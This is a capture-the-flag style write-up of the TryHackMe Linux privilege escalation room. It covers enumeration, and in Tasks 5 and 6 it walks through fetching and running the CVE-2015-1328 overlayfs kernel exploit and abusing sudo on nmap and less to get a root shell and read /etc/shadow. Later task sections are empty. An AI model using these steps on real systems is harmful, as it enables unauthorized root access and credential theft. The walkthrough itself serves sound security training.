```
┃  ┛┏━ ┃ ┃┃ ┃  ┏━┃┏━┃┛┃ ┃┛┃  ┏━┛┏━┛┏━┛  ┏━┛┏━┛┏━┛┏━┃┃  ┏━┃━┏┛┛┏━┃┏━ 
┃  ┃┃ ┃┃ ┃ ┛   ┏━┛┏┏┛┃┃ ┃┃┃  ┏━┛┃ ┃┏━┛  ┏━┛━━┃┃  ┏━┃┃  ┏━┃ ┃ ┃┃ ┃┃ ┃
━━┛┛┛ ┛━━┛┛ ┛  ┛  ┛ ┛┛ ┛ ┛━━┛━━┛━━┛━━┛  ━━┛━━┛━━┛┛ ┛━━┛┛ ┛ ┛ ┛━━┛┛ ┛
```
In this TryHackMe room, we learn the fundamentals of Linux privilege escalation. From
enumeration to exploitation, we study different privilege escalation techniques. [^1]

Task 3 - Enumeration
-----------------------------------------------------------------------------------------
**What is the hostname of the target system?**

The enumeration phase is the first step in exploring the system to discover potentially
fatal vulnerabilities and the final step, post-compromise. The `hostname` command returns
the hostname of our target system. It can not represent an identifier, but a goood idea
since most systems leave it at their default value.

**What is the Linux kernel version of the target system?**

With the `uname -a` command, we are able to get additional information about the kernel
used by the system.

**What Linux is this?**

From the previous command, we already know the Linux distribution. But instead, we want
to dig deeper with the `/etc/os-release` file and thus find out the pretty name for the
OS which is the answer to this task.

**What version of the Python language is installed on the system?**

We find out that there is both Python2 and Python3 installed, but for this task we want
the `python --version`.

**What vulnerability seem to affect the kernel of the target system?**

For this, we can search for the kernel version "3.13.0" in the Exploit Database [^2] and
discover the *CVE* for the vulnerability on local privilege escalation by clicking on one
of the two exploits and reading the docstring.

Task 5 - Privilege Escalation: Kernel Exploits
-----------------------------------------------------------------------------------------
**Find and use the appropriate kernel exploit to gain root privileges on the target
system.**

At first, we check the username with whom we are logged in on the target machine, with
`whoami` and I find out that we are indeed *karen*. It is our objective in this task, to
gain *root* access without any knowledge of their credentials through a privilege
escalation exploit. In this kernel exploit methodology, we first identify the kernel
version, e.g. with `uname -a` which leads to the kernel version "3.13.0-24-generic",
same as before. We already searched for it in the Exploit Database [^2] and further
inform ourselves about the CVE "CVE-2015-1328" on the *National Vulnerability Database*
(NVD) [^3]. Here, we find out this kernel version has a problem in the "overlayfs"
implementation where Ubuntu does not properly check permissions for file creation in the
upper filesystem directory. Next, we search for suitable exploits for the CVE "2015-1328"
in the Exploit Database [^2] and are able to discover the *overlayfs* local privilege
escalation script [^4] which we can download on our attacking machine with the command
`wget https://www.exploit-db.com/download/37292`. Then, we proceed to save this file as
`ofs.c` and send it to the target machine by setting up a server on our attacking machine
with `python3 -m http.server 8080` and download it on the target machine with
`wget <ATTACK_BOX_IP_ADDRESS>:8080/ofs.c`.

**What is the content of the `flag1.txt` file?**

However, we must first create a temporary directory in `/tmp/` because we are not 
allowed to write to a new file in our missing home directory or anywhere else. Having 
done this, we should have the exploit script in the temporary directory, and we can 
compile it with `gcc ofs.c -o ofs`. Finally, we can execute it with `./ofs` which results
in the following notifications.

> spawning threads <br>
> mount #1 <br>
> mount #2 <br>
> child threads done <br>
> /etc/ld.so.preload created <br>
> creating shared library <br>

And indeed, with `whoami` we can find out, that we are *root* and we can thus read the
contents of the `/home/matt/flag1.txt` file, which we already spotted earlier but were
not able to view due to missing root privileges.

Task 6 - Privilege Escalation: Sudo
-----------------------------------------------------------------------------------------
**How many programs can the user *karen* run on the target system with sudo rights?**

By running the `sudo -l` command, we find out, that *karen* can run the `find`, `less`
and `nano` commands.

**What is the content of the `flag2.txt` file?**

From the previous task, we already know that we can run the `less` command with elevated
privileges. After browsing the `/home/ubuntu` directory, we can discover the `flag2.txt`
file, which we can open this way.

**How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?**

This task requires us to look at the `nmap` entry in *GTFOBins* [^5] in order to find
out how we could spawn an interactive system shell. Since we have *root* access on it,
we can use `sudo nmap --interactive` in order to spawn a privileged shell.

**What is the hash of *frank's* password?**

Again, we have a look at *GTFOBins*, but this time for the `less` command [^6] over
which *karen* has `sudo` access to. Since we are interested in the `/etc/shadow` file,
which we could normally not access, we want to find out a *file read* circumvention with
`sudo less /etc/hosts`. Having done this, we can examine the passwords file with
`:e /etc/shadow` which shows us the password hash of *frank*.

Task 7 - Privilege Escalation: SUID
-----------------------------------------------------------------------------------------

Task 8 - Privilege Escalation: Capabilities
-----------------------------------------------------------------------------------------

Task 9 - Privilege Escalation: Cron Jobs
-----------------------------------------------------------------------------------------

Task 10 - Privilege Escalation: PATH
-----------------------------------------------------------------------------------------

Task 11 - Privilege Escalation: NFS
-----------------------------------------------------------------------------------------

Task 12 - Capstone Challenge
-----------------------------------------------------------------------------------------

[^1]: https://tryhackme.com/room/linprivesc
[^2]: https://www.exploit-db.com/
[^3]: https://nvd.nist.gov/vuln/detail/CVE-2015-1328
[^4]: https://www.exploit-db.com/exploits/37292
[^5]: https://gtfobins.org/gtfobins/nmap/
[^6]: https://gtfobins.org/gtfobins/less/
